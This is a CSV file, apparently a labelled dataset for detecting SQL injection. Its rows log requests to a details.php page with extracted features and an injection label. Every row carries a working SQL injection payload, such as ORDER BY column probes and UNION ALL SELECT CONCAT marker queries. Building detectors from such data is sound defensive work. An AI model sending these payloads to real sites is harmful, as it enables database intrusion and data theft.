full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5%20ORDER%20BY%201--%20-&type=%3F,/details.php?prod=5 ORDER BY 1-- -&type=?,192.168.43.6,1681395118.289277,2,17,97.8,1,17.647058823529413,1
/details.php?prod=5%20ORDER%20BY%206660--%20-&type=%3F,/details.php?prod=5 ORDER BY 6660-- -&type=?,192.168.43.6,1681395118.293718,2,20,97.8,1,15.0,1
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=%3F,/details.php?prod=5 ORDER BY 10-- -&type=?,192.168.43.6,1681395118.298958,2,18,97.8,1,16.666666666666668,1
/details.php?prod=5%20ORDER%20BY%206--%20-&type=%3F,/details.php?prod=5 ORDER BY 6-- -&type=?,192.168.43.6,1681395118.320209,2,17,97.8,1,17.647058823529413,1
/details.php?prod=5%20ORDER%20BY%204--%20-&type=%3F,/details.php?prod=5 ORDER BY 4-- -&type=?,192.168.43.6,1681395118.329546,2,17,97.8,1,17.647058823529413,1
/details.php?prod=5%20ORDER%20BY%205--%20-&type=%3F,/details.php?prod=5 ORDER BY 5-- -&type=?,192.168.43.6,1681395118.33392,2,17,97.8,1,17.647058823529413,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x7a65756a6c4d7269496a54776f67674e4e6f7054706f524979494d6975756d63625369654c4e6574%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x7a65756a6c4d7269496a54776f67674e4e6f7054706f524979494d6975756d63625369654c4e6574,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.343668,4,160,97.8,1,3.125,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4e5273787954675343546b4543727167475466436568454f774178634e6b656b587573414479754f%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x4e5273787954675343546b4543727167475466436568454f774178634e6b656b587573414479754f,0x717a626271),NULL,NULL-- -&type=?",192.168.43.6,1681395118.349722,4,160,97.8,1,3.125,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x65785659765550636e75664874526749716346765a4f4f58446f796a4147707a67504e534a785373%2C0x717a626271%29%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a6271,0x65785659765550636e75664874526749716346765a4f4f58446f796a4147707a67504e534a785373,0x717a626271),NULL-- -&type=?",192.168.43.6,1681395118.362147,4,160,97.8,1,3.125,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x4e4b727650575a7174595159706e497572426862596642416175746345436b4873704f6f70544d6f%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x71717a6271,0x4e4b727650575a7174595159706e497572426862596642416175746345436b4873704f6f70544d6f,0x717a626271),NULL,NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.372366,4,160,97.8,1,3.125,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x63497454717a67716b757a47444d47536146724166727470544a766c47516b5a5173437659785974%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x63497454717a67716b757a47444d47536146724166727470544a766c47516b5a5173437659785974,0x717a626271)-- -&type=?",192.168.43.6,1681395118.377464,4,160,97.8,1,3.125,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x6b536c724c784c794f51%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x6b536c724c784c794f51,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.411063,4,100,97.8,1,5.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x544277666a7353774f67%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x544277666a7353774f67,0x717a626271),NULL,NULL-- -&type=?",192.168.43.6,1681395118.417501,4,100,97.8,1,5.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x7662684e736348437059%2C0x717a626271%29%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a6271,0x7662684e736348437059,0x717a626271),NULL-- -&type=?",192.168.43.6,1681395118.481401,4,100,97.8,1,5.0,1
